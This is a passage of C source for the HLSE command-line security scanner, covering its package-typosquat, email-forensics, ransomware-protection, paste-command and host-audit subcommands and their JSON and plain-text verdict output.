                   "\"files_scanned\":%d,\"threats\":%d,"
                   "\"max_severity\":%d,"
                   "\"gate_hits\":%d,\"fail_threshold\":%d,"
                   "\"asset_classes\":%d,\"blast_radius\":\"%s\"",
                   esc_root, files_scanned, threats,
                   hlse_severity_for_score(max_score),
                   gate_hits, g_fail_threshold,
                   nclasses, classes);
            if (dirs_unreadable > 0)
                printf(",\"dirs_unreadable\":%d", dirs_unreadable);
            if (threats == 0) {
                const char *bs = hlse_blindspot_for("scan");
                json_field("blind_spot", bs);
            } else {
                const char *ia = scan_immediate_action((unsigned)asset_mask, nclasses);
                json_field("immediate_action", ia);
            }
            printf("}\n");
        }
        return gate_hits > 0 ? 1 : 0;
    }
#pragma GCC diagnostic pop
}

/* `package` subcommand, extracted verbatim from main(). */
static int
cmd_package(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s package <name> [pip|npm|cargo|go]\n"
                "       %s package --manifest <file> [pip|npm|cargo|go|gem]\n",
                argv[0], argv[0]);
        return 2;
    }
    /* --manifest <file>: scan every dependency in a manifest (P1-8). */
    if (strcmp(argv[idx + 1], "--manifest") == 0) {
        const char *mpath, *eco;
        FILE *mf;
        char line[4096];
        int in_deps = 0, checked = 0, threats = 0, gate_hits = 0;
        int max_score = 0, lineno = 0;
        if (argc < idx + 3) {
            fprintf(stderr, "Usage: %s package --manifest <file> [eco]\n",
                    argv[0]);
            return 2;
        }
        mpath = argv[idx + 2];
        eco = (argc > idx + 3) ? argv[idx + 3] : manifest_ecosystem(mpath);
        if (!eco) {
            fprintf(stderr, "Error: cannot infer ecosystem from '%s' \xe2\x80\x94 "
                    "pass one explicitly (pip|npm|cargo|go|gem)\n", mpath);
            return 2;
        }
        mf = fopen(mpath, "r");
        if (!mf) {
            fprintf(stderr, "Error: cannot read manifest '%s': %s\n",
                    mpath, strerror(errno));
            return 2;
        }
        while (fgets(line, sizeof(line), mf)) {
            char name[128];
            const char *cursor = line;
            int is_npm = (strcmp(eco, "npm") == 0);
            lineno++;
            /* npm: a line may hold several "name":"ver" pairs (compact
             * object form), so drain the cursor. pip: one name per line. */
            for (;;) {
                int got;
                if (is_npm)
                    got = manifest_name_npm(&cursor, &in_deps, name, sizeof(name));
                else
                    got = manifest_name_pip(line, name, sizeof(name));
                if (!got || name[0] == '\0') break;
            {
                PackageVerdict pv = hlse_check_package(name, eco);
                checked++;
                if (pv.score >= 40) {
                    threats++;
                    if (pv.score > max_score) max_score = pv.score;
                    if (pv.score >= g_fail_threshold) gate_hits++;
                    if (o->sarif_out) {
                        char msg[512];
                        snprintf(msg, sizeof(msg), "%s",
                                 pv.reason[0] ? pv.reason
                                 : "dependency typosquat");
                        sarif_add(mpath, lineno, "package-typosquat",
                                  "HLSE-PKG-TYPOSQUAT", msg, pv.score);
                    } else if (o->json_out) {
                        char en[128];
                        int i;
                        hlse_json_escape(name, en, sizeof(en));
                        printf("{\"kind\":\"package\",\"hlse_version\":\""
                               HLSE_VERSION "\",\"name\":\"%s\","
                               "\"ecosystem\":\"%s\",\"score\":%d,"
                               "\"action\":\"%s\",\"severity\":%d,"
                               "\"pattern_id\":\"HLSE-PKG-TYPOSQUAT\","
                               "\"matches\":[",
                               en, eco, pv.score,
                               hlse_action_for_score(pv.score),
                               hlse_severity_for_score(pv.score));
                        for (i = 0; i < pv.n_matches; i++)
                            printf("%s{\"name\":\"%s\",\"registry\":\"%s\","
                                   "\"distance\":%d}", i ? "," : "",
                                   pv.matches[i].legit_name,
                                   pv.matches[i].registry,
                                   pv.matches[i].distance);
                        printf("]}\n");
                    } else {
                        printf("%-7s [%d]  %s (%s)\n",
                               hlse_action_for_score(pv.score), pv.score,
                               name, eco);
                        if (pv.reason[0])
                            printf("  \xc2\xb7 %s\n", pv.reason);
                    }
                }
            }
                if (!is_npm) break;   /* pip: one name per line */
            }  /* for(;;) drain-line */
        }
        fclose(mf);
        if (o->sarif_out) {
            sarif_emit(HLSE_VERSION);
        } else if (o->json_out) {
            char ep[4096];
            hlse_json_escape(mpath, ep, sizeof(ep));
            printf("{\"kind\":\"manifest_summary\",\"hlse_version\":\""
                   HLSE_VERSION "\",\"manifest\":\"%s\",\"ecosystem\":\"%s\","
                   "\"packages_checked\":%d,\"threats\":%d,"
                   "\"max_severity\":%d,\"gate_hits\":%d}\n",
                   ep, eco, checked, threats,
                   hlse_severity_for_score(max_score), gate_hits);
        } else if (threats == 0) {
            printf("OK    %s (%d packages checked, 0 typosquat risks)\n",
                   mpath, checked);
        } else {
            printf("\n%d suspicious package(s) of %d checked in %s\n",
                   threats, checked, mpath);
        }
        return gate_hits > 0 ? 1 : 0;
    }
    {
        const char *eco = (argc > idx + 2) ? argv[idx + 2] : NULL;
        PackageVerdict pv = hlse_check_package(argv[idx + 1], eco);
        /* Sanitized display copy of the package name for plain-text echoes
         * (CWE-150); the raw name already drove the check. */
        char pdisp[256];
        snprintf(pdisp, sizeof pdisp, "%s", argv[idx + 1]);
        hlse_sanitize_terminal(pdisp);
        {
            const char *aar[1]; int aqn = 0;
            if (pv.reason[0]) { aar[0] = pv.reason; aqn = 1; }
            hlse_alert_emit("package", pv.score,
                hlse_severity_for_score(pv.score), argv[idx + 1], aar, aqn);
        }
        if (o->json_out) {
            printf("{\"kind\":\"package\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"name\":\"%s\",\"score\":%d,"
                   "\"action\":\"%s\",\"severity\":%d",
                   argv[idx + 1], pv.score, hlse_action_for_score(pv.score),
                   hlse_severity_for_score(pv.score));
            if (pv.n_matches > 0) {
                int i;
                printf(",\"matches\":[");
                for (i = 0; i < pv.n_matches; i++) {
                    printf("%s{\"name\":\"%s\",\"registry\":\"%s\","
                           "\"distance\":%d}",
                           i > 0 ? "," : "",
                           pv.matches[i].legit_name,
                           pv.matches[i].registry,
                           pv.matches[i].distance);
                }
                printf("]");
            }
            if (pv.score == 0) {
                /* reason non-empty => exact match to a known package;
                 * empty => unknown name, which we cannot verify offline. */
                const char *bs = hlse_blindspot_for(
                    pv.reason[0] ? "package" : "package_unverified");
                json_field("blind_spot", bs);
            }
            if (pv.score > 0) {
                int ns = pv.n_matches > 0 ? pv.n_matches : 1;
                const char *conf = ns >= 3 ? "high confidence" :
                                   ns >= 2 ? "corroborated" : "single signal";
                printf(",\"signal_count\":%d,\"confidence\":\"%s\"", ns, conf);
            }
            if (pv.score >= 40) {
                /* Perspective 97: a name matching 2+ registries at once
                 * (e.g. "reqests" ~ pip "requests" dist-1 AND cargo
                 * "reqwest" dist-2, when no ecosystem is given) lands at
                 * score 50 alone — the n_matches==1 amplifier to 70 never
                 * fires — but pattern/objective/verify used to require
                 * >= 60, the same gap P95/P96 closed elsewhere.
                 * Perspective 103: text now shared with the plaintext
                 * path below via package_*_text() accessors. */
                json_field("pattern", package_pattern_text());
                printf(",\"pattern_id\":\"HLSE-PKG-TYPOSQUAT\"");
                json_field("objective", package_objective_text());
                json_field("verify", package_verify_text());
            }
            if (pv.score >= 60) {
                json_field("triage", package_triage_text());
                json_field("cascade_risk", package_cascade_text());
            }
            if (pv.score > 0 && pv.score < 60) {
                const char *ex = hlse_exoneration_for("package", pv.score);
                if (ex) {
                    json_field("exoneration", ex);
                }
            }
            printf("}\n");
        } else if (pv.score == 0) {
            const char *bs = hlse_blindspot_for(
                pv.reason[0] ? "package" : "package_unverified");
            printf("OK    %s\n", pdisp);
            /* Mirror the URL canonical-confirmation line: say explicitly
             * when the name IS recognised, so "OK" is not ambiguous
             * between "known good" and "never heard of it". */
            if (pv.reason[0]) printf("  \xe2\x9c\x94 %s\n", pv.reason);
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            printf("%-7s [%d]  %s\n",
                   hlse_action_for_score(pv.score), pv.score,
                   pdisp);
            if (pv.reason[0])
                printf("  \xc2\xb7 %s\n", pv.reason);
            if (pv.score >= 40) {
                printf("  \xe2\x96\xb8 Pattern: %s\n", package_pattern_text());
                printf("  \xe2\x97\x89 Attacker's goal: %s\n", package_objective_text());
                printf("  \xe2\x9c\x93 Verify first: %s\n", package_verify_text());
            }
            if (pv.score >= 60) {
                printf("  \xe2\x9a\x91 If you acted: %s\n", package_triage_text());
                printf("  \xe2\x8a\x95 Also change: %s\n", package_cascade_text());
            }
            if (pv.score < 60) {
                const char *ex = hlse_exoneration_for("package", pv.score);
                if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
            }
        }
        return pv.score >= g_fail_threshold ? 1 : 0;
    }
}

/* `email` subcommand, extracted verbatim from main(). */
static int
cmd_email(int argc, char **argv, int idx, const CliOpts *o) {
    static char stdin_buf[1u << 20];  /* 1 MiB, BSS (P1-2) */
    const char *headers;
    /* Perspective 106 (P2-3): --from sets a delivery-channel prior that
     * boosts URL/text scores, but email headers are BY DEFINITION
     * received over email — the channel is intrinsic and fixed, so a
     * --from override (especially a non-email one like sms) is
     * meaningless here. The flag was silently ignored, which reads like a
     * bug; make it explicit with a one-line stderr note instead. */
    if (g_from_channel) {
        fprintf(stderr,
                "hlse: note: --from is ignored for the email subcommand "
                "\xe2\x80\x94 email headers are intrinsically the email "
                "channel; the channel prior is not applied\n");
    }
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s email \"<headers>\" | %s email --stdin\n",
                argv[0], argv[0]);
        return 2;
    } else if (strcmp(argv[idx + 1], "--stdin") == 0) {
        read_stdin_all(stdin_buf, sizeof(stdin_buf));
        headers = stdin_buf;
    } else {
        headers = argv[idx + 1];
    }
    {
        EmailVerdict ev = hlse_check_email_headers(headers);
        {
            const char *aar[16]; int aq, aqn = ev.n_reasons;
            if (aqn > 16) aqn = 16;
            for (aq = 0; aq < aqn; aq++) aar[aq] = ev.reasons[aq];
            hlse_alert_emit("email", ev.score,
                hlse_severity_for_score(ev.score), "(email headers)", aar, aqn);
        }
        const char *rem = hlse_remediation_for("email", ev.score);
        /* Header forensics (SPF/DKIM/Reply-To/Received) is blind to the
         * message BODY's social engineering. Run text analysis on the same
         * input and surface the attack-pattern lens as ADVISORY only — the
         * email score is unchanged (preserves F1), but a BEC/urgency body
         * that header checks alone would miss is now named. */
        TextVerdict bodytv = hlse_check_text(headers);
        const char *body_pat = hlse_classify_text_attack(&bodytv);
        if (o->json_out) {
            int i;
            printf("{\"kind\":\"email\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"score\":%d,\"action\":\"%s\","
                   "\"severity\":%d,\"reasons\":[",
                   ev.score, hlse_action_for_score(ev.score),
                   hlse_severity_for_score(ev.score));
            for (i = 0; i < ev.n_reasons; i++) {
                char esc[512];
                hlse_json_escape(ev.reasons[i], esc, sizeof(esc));
                printf("%s\"%s\"", i > 0 ? "," : "", esc);
            }
            printf("]");
            if (ev.score == 0 && !body_pat) {
                const char *bs = hlse_blindspot_for("email");
                json_field("blind_spot", bs);
            }
            if (body_pat) {
                char epat[256];
                hlse_json_escape(body_pat, epat, sizeof(epat));
                printf(",\"body_pattern\":\"%s\",\"body_score\":%d",
                       epat, bodytv.score);
                /* Emit pattern and pattern_id from body analysis, plus signal count/confidence */
                printf(",\"signal_count\":2,\"confidence\":\"two independent signals — header authentication + body text both analyzed\"");
                TextVerdict btv_hi = bodytv;
                char e[512];
                const char *bpat, *bobj, *bvrf, *btri, *bcas, *bex;
                btv_hi.score = ev.score > bodytv.score ? ev.score : bodytv.score;
                bpat = hlse_classify_text_attack(&btv_hi);
                bobj = hlse_text_objective(&btv_hi);
                bex  = hlse_text_exoneration(&btv_hi);
                bvrf = hlse_text_verify(&btv_hi);
                btri = hlse_text_triage(&btv_hi);
                bcas = hlse_text_cascade(&btv_hi);
                json_field("pattern", bpat);
                if (bpat) {
                    const char *bid = hlse_text_pattern_id(&btv_hi);
                    json_field("pattern_id", bid);
                }
                if (bex && btv_hi.score >= 15 && btv_hi.score < 60) {
                    hlse_json_escape(bex,e,sizeof(e)); printf(",\"exoneration\":\"%s\"",e);
                }
                /* Perspective 95: verify now fires from the ALERT floor
                 * (btv_hi.score >= 40, the combined header/body score) —
                 * objective/triage/cascade_risk stay gated on ev.score
                 * >= 60 (header-confidence threshold, unchanged). */
                if (bvrf && btv_hi.score >= 40) {
                    json_field("verify", bvrf);
                }
                if (ev.score >= 60) {
                    json_field("objective", bobj);
                    json_field("triage", btri);
                    json_field("cascade_risk", bcas);
                }
            } else if (ev.score >= 60) {
                /* Header-only BLOCK: synthesise BEC advisory lenses */
                TextVerdict etv;
                const char *epat2, *eobj, *evrf, *etri, *ecas;
                text_verdict_synth(&etv, ev.score,
                                   "BEC: email header authentication failure "
                                   "(SPF/DKIM/Reply-To spoofing)");
                epat2 = hlse_classify_text_attack(&etv);
                eobj  = hlse_text_objective(&etv);
                evrf  = hlse_text_verify(&etv);
                etri  = hlse_text_triage(&etv);
                ecas  = hlse_text_cascade(&etv);
                printf(",\"signal_count\":1,\"confidence\":\"single signal — email header authentication anomalies detected\"");
                json_field("pattern", epat2);
                if (epat2) { const char *pid = hlse_text_pattern_id(&etv); json_field("pattern_id", pid); }
                json_field("objective", eobj);
                json_field("verify", evrf);
                json_field("triage", etri);
                json_field("cascade_risk", ecas);
            } else if (ev.score > 0) {
                /* Borderline header score (1-59): emit signal_count, confidence, and exoneration */
                printf(",\"signal_count\":1");
                TextVerdict etv;
                const char *econn = hlse_exoneration_for("email", ev.score);
                if (econn) {
                    json_field("exoneration", econn);
                }
                memset(&etv, 0, sizeof(etv));
                etv.score = ev.score;
                printf(",\"confidence\":\"partial signal — some email header concerns but not conclusive spoofing\"");
            }
            if (rem) {
                json_field("remediation", rem);
            }
            printf("}\n");
        } else if (ev.score == 0 && !body_pat) {
            const char *bs = hlse_blindspot_for("email");
            printf("OK    (email \xe2\x80\x94 no spoofing signals)\n");
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            int i;
            const char *ex = hlse_exoneration_for("email", ev.score);
            if (ev.score == 0)
                printf("OK    [0]  (email forensics) "
                       "\xe2\x80\x94 headers clean, but body flagged below\n");
            else
                printf("%-7s [%d]  (email forensics)\n",
                       hlse_action_for_score(ev.score), ev.score);
            for (i = 0; i < ev.n_reasons; i++)
                printf("  \xc2\xb7 %s\n", ev.reasons[i]);
            if (body_pat) {
                /* Use email header score for advisory threshold */
                TextVerdict btv_hi = bodytv;
                const char *bobj, *bvrf, *btri, *bcas;
                if (ev.score >= 60) btv_hi.score = ev.score;
                bobj = hlse_text_objective(&btv_hi);
                bvrf = hlse_text_verify(&btv_hi);
                btri = hlse_text_triage(&btv_hi);
                bcas = hlse_text_cascade(&btv_hi);
                printf("  \xe2\x96\xb8 Body pattern: %s (body score %d)\n",
                       body_pat, bodytv.score);
                if (bobj) printf("  \xe2\x97\x89 Attacker's goal: %s\n", bobj);
                /* Perspective 95: verify fires from the ALERT floor
                 * (btv_hi.score >= 40); triage/cascade stay BLOCK+-only. */
                if (bvrf && btv_hi.score >= 40)
                    printf("  \xe2\x9c\x93 Verify first: %s\n", bvrf);
                if (ev.score >= 60) {
                    if (btri) printf("  \xe2\x9a\x91 If you acted: %s\n", btri);
                    if (bcas) printf("  \xe2\x8a\x95 Also change: %s\n", bcas);
                }
            } else if (ev.score >= 60) {
                /* Header-only BLOCK: synthesise BEC advisory lenses */
                TextVerdict etv;
                const char *epat2, *eobj, *evrf, *etri, *ecas;
                text_verdict_synth(&etv, ev.score,
                                   "BEC: email header authentication failure "
                                   "(SPF/DKIM/Reply-To spoofing)");
                epat2 = hlse_classify_text_attack(&etv);
                eobj  = hlse_text_objective(&etv);
                evrf  = hlse_text_verify(&etv);
                etri  = hlse_text_triage(&etv);
                ecas  = hlse_text_cascade(&etv);
                if (epat2) printf("  \xe2\x96\xb8 Pattern: %s\n", epat2);
                if (eobj)  printf("  \xe2\x97\x89 Attacker's goal: %s\n", eobj);
                if (evrf)  printf("  \xe2\x9c\x93 Verify first: %s\n", evrf);
                if (etri)  printf("  \xe2\x9a\x91 If you acted: %s\n", etri);
                if (ecas)  printf("  \xe2\x8a\x95 Also change: %s\n", ecas);
            }
            if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
            if (rem) printf("  \xe2\x86\x92 Action: %s\n", rem);
        }
        return ev.score >= g_fail_threshold ? 1 : 0;
    }
}

/* Human labels and JSON ids for the protect modules, used by both output
 * paths below. Nothing outside this file needs the mapping. */
static const struct {
    int flag; const char *id; const char *label; const char *hint;
} PROTECT_MODULES[] = {
    { HLSE_PROTECT_RANSOMWARE,    "ransomware",
      "ransomware indicators",    "the target directory could not be opened" },
    { HLSE_PROTECT_NETWORK_DRIVE, "network_drive",
      "network-drive mounts",     "/proc/mounts could not be read" },
    { HLSE_PROTECT_SMB,           "smb",
      "SMB canary files",         "the share could not be stat'ed" },
    { HLSE_PROTECT_MBR,           "mbr",
      "MBR boot sector",
      "the device could not be read \xe2\x80\x94 re-run as root" }
};

/* One line per module that scored 0 because it could not read its evidence.
 * Without this the merge in hlse_protect_scan() silently dropped the module's
 * own diagnostic and the run looked complete. */
static void
print_protect_unchecked(const ProtectionVerdict *pv) {
    size_t mi;
    if (!pv->modules_unchecked) return;
    for (mi = 0; mi < sizeof(PROTECT_MODULES) / sizeof(PROTECT_MODULES[0]); mi++)
        if (pv->modules_unchecked & PROTECT_MODULES[mi].flag)
            printf("  \xe2\x9a\xa0 Not checked: %s \xe2\x80\x94 %s\n",
                   PROTECT_MODULES[mi].label, PROTECT_MODULES[mi].hint);
}

/* `protect` subcommand, extracted verbatim from main(). */
static int
cmd_protect(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s protect <path> [--ransomware|--smb|--mbr|--net]\n", argv[0]);
        return 2;
    }
    {
        const char *path = argv[idx + 1];
        int modules = 0;

        /* Verify path exists */
        if (access(path, F_OK) != 0) {
            fprintf(stderr, "Error: cannot access '%s': %s\n",
                    path, strerror(errno));
            return 2;
        }
        int ai;

        /* Parse module flags */
        for (ai = idx + 2; ai < argc; ai++) {
            if (strcmp(argv[ai], "--ransomware") == 0) modules |= HLSE_PROTECT_RANSOMWARE;
            else if (strcmp(argv[ai], "--smb") == 0)   modules |= HLSE_PROTECT_SMB;
            else if (strcmp(argv[ai], "--mbr") == 0)   modules |= HLSE_PROTECT_MBR;
            else if (strcmp(argv[ai], "--net") == 0)    modules |= HLSE_PROTECT_NETWORK_DRIVE;
        }
        if (modules == 0) {
            /* Auto-detect: if path starts with /dev/, use MBR; else file-based */
            if (strncmp(path, "/dev/", 5) == 0) {
                modules = HLSE_PROTECT_MBR;
            } else {
                modules = HLSE_PROTECT_RANSOMWARE | HLSE_PROTECT_SMB | HLSE_PROTECT_NETWORK_DRIVE;
            }
        }

        ProtectionVerdict pv = hlse_protect_scan(path, modules);
        {
            const char *aar[16]; int aq, aqn = pv.n_reasons;
            if (aqn > 16) aqn = 16;
            for (aq = 0; aq < aqn; aq++) aar[aq] = pv.reasons[aq];
            hlse_alert_emit("protect", pv.score,
                hlse_severity_for_score(pv.score), path, aar, aqn);
        }

        if (o->json_out) {
            /* JSON output for protect.
             * Perspective 100: this was the only verdict kind still
             * missing hlse_version and severity — every other kind
             * (url/text/file/secret/email/network/esp/package/paste/
             * clipboard) has carried both since P84/P85; protect was
             * never brought in line. */
            char esc_path[4096];
            hlse_json_escape(path, esc_path, sizeof(esc_path));
            printf("{\"kind\":\"protect\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"target\":\"%s\",\"score\":%d,"
                   "\"action\":\"%s\",\"severity\":%d,\"reasons\":[",
                   esc_path, pv.score,
                   hlse_action_for_score(pv.score),
                   hlse_severity_for_score(pv.score));
            {
                int i;
                for (i = 0; i < pv.n_reasons; i++) {
                    char esc[512];
                    hlse_json_escape(pv.reasons[i], esc, sizeof(esc));
                    printf("%s\"%s\"", i > 0 ? "," : "", esc);
                }
            }
            printf("]");
            printf(",\"target_scanned\":%s",
                   pv.target_unreadable ? "false" : "true");
            if (pv.modules_unchecked) {
                size_t mi; int first = 1;
                printf(",\"modules_unchecked\":[");
                for (mi = 0; mi < sizeof(PROTECT_MODULES) /
                                  sizeof(PROTECT_MODULES[0]); mi++)
                    if (pv.modules_unchecked & PROTECT_MODULES[mi].flag) {
                        printf("%s\"%s\"", first ? "" : ",",
                               PROTECT_MODULES[mi].id);
                        first = 0;
                    }
                printf("]");
            }
            if (pv.score == 0) {
                const char *bs = hlse_blindspot_for("protect");
                json_field("blind_spot", bs);
            }
            if (pv.score > 0) {
                int ns = pv.n_reasons;
                const char *conf = ns >= 3 ? "high confidence" :
                                   ns >= 2 ? "corroborated" : "single signal";
                printf(",\"signal_count\":%d,\"confidence\":\"%s\"", ns, conf);
            }
            if (pv.score >= 40) {
                /* Perspective 100: a single SMB canary-file access (+40)
                 * or mass-rename detection (+40) lands the protect
                 * verdict in ALERT (40-59) alone — the same gap P95-98
                 * closed for other kinds. pattern/objective/verify now
                 * fire from the ALERT floor; triage/cascade_risk
                 * (disconnect-network incident response) stay
                 * BLOCK+-only (>= 60).
                 * Perspective 103: text now shared with the plaintext
                 * path below via protect_*_text() accessors. */
                json_field("pattern", protect_pattern_text());
                printf(",\"pattern_id\":\"HLSE-PROTECT-RANSOM\"");
                json_field("objective", protect_objective_text());
                json_field("verify", protect_verify_text());
            }
            if (pv.score >= 60) {
                json_field("triage", protect_triage_text());
                json_field("cascade_risk", protect_cascade_text());
            }
            if (pv.score > 0 && pv.score < 60) {
                const char *ex = hlse_exoneration_for("protect", pv.score);
                if (ex) {
                    json_field("exoneration", ex);
                }
            }
            printf("}\n");
        } else if (pv.score == 0) {
            const char *bs = hlse_blindspot_for("protect");
            if (pv.target_unreadable) {
                /* Nothing in the target was examined, so a score of 0 is the
                 * absence of evidence, not evidence of absence. The per-module
                 * lines printed just below say which checks that cost us, so
                 * this only has to mark the headline. */
                printf("OK    %s (NOT scanned \xe2\x80\x94 target could not be "
                       "opened)\n", path);
            } else {
                printf("OK    %s\n", path);
            }
            print_protect_unchecked(&pv);
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            int i;
            printf("%-7s [%d]  %s\n",
                   hlse_action_for_score(pv.score), pv.score, path);
            for (i = 0; i < pv.n_reasons; i++) {
                printf("  \xc2\xb7 %s\n", pv.reasons[i]);
            }
            /* Also on a scored verdict: a partial result must not read as a
             * complete one just because something else did fire. */
            print_protect_unchecked(&pv);
            if (pv.score >= 40) {
                printf("  \xe2\x96\xb8 Pattern: %s\n", protect_pattern_text());
                printf("  \xe2\x97\x89 Attacker's goal: %s\n", protect_objective_text());
                printf("  \xe2\x9c\x93 Verify first: %s\n", protect_verify_text());
            }
            if (pv.score >= 60) {
                printf("  \xe2\x9a\x91 Immediate action: %s\n", protect_triage_text());
                printf("  \xe2\x8a\x95 Also change: %s\n", protect_cascade_text());
            }
            if (pv.score < 60) {
                const char *ex = hlse_exoneration_for("protect", pv.score);
                if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
            }
        }
        return pv.score >= g_fail_threshold ? 1 : 0;
    }
}

/* `paste` subcommand, extracted verbatim from main(). */
static int
cmd_paste(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s paste \"<command text>\"\n", argv[0]);
        return 2;
    }
    {
        PasteVerdict pv = hlse_check_paste(argv[idx + 1]);
        {
            const char *aar[16]; int aq, aqn = pv.n_reasons;
            if (aqn > 16) aqn = 16;
            for (aq = 0; aq < aqn; aq++) aar[aq] = pv.reasons[aq];
            hlse_alert_emit("paste", pv.score,
                hlse_severity_for_score(pv.score), argv[idx + 1], aar, aqn);
        }
        if (o->json_out) {
            int i;
            printf("{\"kind\":\"paste\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"score\":%d,\"action\":\"%s\","
                   "\"severity\":%d,\"signals\":%d",
                   pv.score, hlse_action_for_score(pv.score),
                   hlse_severity_for_score(pv.score), pv.signals);
            if (pv.score == 0) {
                const char *bs = hlse_blindspot_for("paste");
                json_field("blind_spot", bs);
            }
            if (pv.score > 0) {
                /* Count distinct PASTE_* signal families from the bitmask —
                 * the epistemic complement to the score: how many independent
                 * detectors corroborate this paste threat. */
                int ns = 0, bits = pv.signals;
                while (bits) { ns += bits & 1; bits >>= 1; }
                if (ns == 0) ns = pv.n_reasons;  /* fallback if bitmask empty */
                {
                    const char *conf = ns >= 3 ? "high confidence" :
                                       ns >= 2 ? "corroborated" : "single signal";
                    printf(",\"signal_count\":%d,\"confidence\":\"%s\"", ns, conf);
                }
            }
            if (pv.score >= 40) {
                /* Build a minimal TextVerdict so the existing advisory
                 * machinery fires: "Shell-pipe" triggers ClickFix
                 * classification in hlse_classify_text_attack().
                 * Perspective 95: pattern/objective/verify now fire from
                 * the ALERT floor (40); triage/cascade_risk stay
                 * BLOCK+-only (60) since post-incident guidance presumes
                 * the user already acted. */
                TextVerdict ptv;
                const char *ppat, *pobj, *pvrf;
                text_verdict_synth(&ptv, pv.score,
                                   "Shell-pipe: paste-and-run pastejacking");
                ppat = hlse_classify_text_attack(&ptv);
                pobj = hlse_text_objective(&ptv);
                pvrf = hlse_text_verify(&ptv);
                json_field("pattern", ppat);
                if (ppat) { const char *pid = hlse_text_pattern_id(&ptv); json_field("pattern_id", pid); }
                json_field("objective", pobj);
                json_field("verify", pvrf);
                if (pv.score >= 60) {
                    const char *ptri, *pcas;
                    ptri = hlse_text_triage(&ptv);
                    pcas = hlse_text_cascade(&ptv);
                    json_field("triage", ptri);
                    json_field("cascade_risk", pcas);
                }
            }
            if (pv.score > 0 && pv.score < 60) {
                const char *ex = hlse_exoneration_for("paste", pv.score);
                if (ex) {
                    json_field("exoneration", ex);
                }
            }
            printf(",\"reasons\":[");
            for (i = 0; i < pv.n_reasons; i++) {
                char esc[512];
                hlse_json_escape(pv.reasons[i], esc, sizeof(esc));
                printf("%s\"%s\"", i > 0 ? "," : "", esc);
            }
            printf("]}\n");
        } else if (pv.score == 0) {
            const char *bs = hlse_blindspot_for("paste");
            printf("OK    (paste)\n");
            if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
        } else {
            int i;
            printf("%-7s [%d]  (paste)\n",
                   hlse_action_for_score(pv.score), pv.score);
            for (i = 0; i < pv.n_reasons; i++)
                printf("  \xc2\xb7 %s\n", pv.reasons[i]);
            if (pv.score >= 40) {
                /* Advisory lenses: every paste ALERT+ is ClickFix/pastejacking.
                 * print_text_advisories internally gates verify at >=40 and
                 * triage/cascade_risk at >=60 (Perspective 95). */
                TextVerdict ptv;
                text_verdict_synth(&ptv, pv.score,
                                   "Shell-pipe: paste-and-run pastejacking");
                print_text_advisories(&ptv);
            }
            if (pv.score > 0 && pv.score < 60) {
                const char *ex = hlse_exoneration_for("paste", pv.score);
                if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
            }
        }
        return pv.score >= g_fail_threshold ? 1 : 0;
    }
}

/* `audit` subcommand, extracted verbatim from main(). */
static int
cmd_audit(int argc, char **argv, int idx, const CliOpts *o) {
    (void)argc; (void)argv; (void)idx;
    AuditVerdict av = hlse_audit_all();
    int hi = hlse_audit_hardening_index(&av);
    /* The index is 100 - score, so a check that could not read its evidence
     * contributes 0 and silently inflates it. Reporting "100/100 (hardened)"
     * for a host whose /etc/sudoers we were never allowed to open is the one
     * output that could actively mislead someone into standing down, so the
     * reassuring word is withheld whenever coverage is incomplete. The number
     * itself is not adjusted: inventing a penalty would be a different claim,
     * equally unfounded. */
    int total = av.checks_run + av.checks_skipped;
    int partial = (av.checks_skipped > 0);
    const char *band = partial ? "partial"
                     : hi >= 90 ? "hardened"
                     : hi >= 70 ? "good"
                     : hi >= 50 ? "fair" : "weak";
    char band_disp[96];
    if (partial)
        snprintf(band_disp, sizeof(band_disp),
                 "coverage incomplete \xe2\x80\x94 %d of %d checks ran",
                 av.checks_run, total);
    else
        snprintf(band_disp, sizeof(band_disp), "%s", band);
    /* Pre-compute severity counts for next_steps guidance */
    int crit_count = 0, high_count = 0;
    { int ci;
      for (ci = 0; ci < av.n_findings; ci++) {
          if (av.findings[ci].severity >= 5) crit_count++;
          else if (av.findings[ci].severity == 4) high_count++;
      }
    }
    if (o->json_out) {
        int i;
        printf("{\"kind\":\"audit\",\"hlse_version\":\"" HLSE_VERSION "\","
               "\"score\":%d,\"action\":\"%s\","
               "\"severity\":%d,"
               "\"hardening_index\":%d,\"hardening_band\":\"%s\","
               "\"checks_run\":%d,\"checks_skipped\":%d,"
               "\"crit_count\":%d,\"high_count\":%d,"
               "\"findings\":[",
               av.score, hlse_action_for_score(av.score),
               hlse_severity_for_score(av.score), hi, band,
               av.checks_run, av.checks_skipped,
               crit_count, high_count);
        for (i = 0; i < av.n_findings; i++) {
            char esc[512];
            const char *fix = (av.findings[i].severity >= 4)
                ? audit_remediation_for(av.findings[i].description)
                : NULL;
            hlse_json_escape(av.findings[i].description, esc, sizeof(esc));
            printf("%s{\"severity\":%d,\"description\":\"%s\"",
                   i > 0 ? "," : "",
                   av.findings[i].severity, esc);
            if (fix) {
                json_field("fix", fix);
            }
            printf("}");
        }
        printf("]");
        if (av.score == 0) {
            const char *bs = hlse_blindspot_for("audit");
            json_field("blind_spot", bs);
        } else {
            char ns[256];
            if (crit_count > 0)
                snprintf(ns, sizeof(ns),
                         "fix the %d critical finding(s) first \xe2\x80\x94 "
                         "CRITICAL items are actively exploitable",
                         crit_count);
            else if (high_count > 0)
                snprintf(ns, sizeof(ns),
                         "fix the %d HIGH finding(s) to reach the next "
                         "hardening band (currently: %s)",
                         high_count, band);
            else
                snprintf(ns, sizeof(ns),
                         "address remaining LOW/MED findings to improve "
                         "the hardening index (currently: %s)",
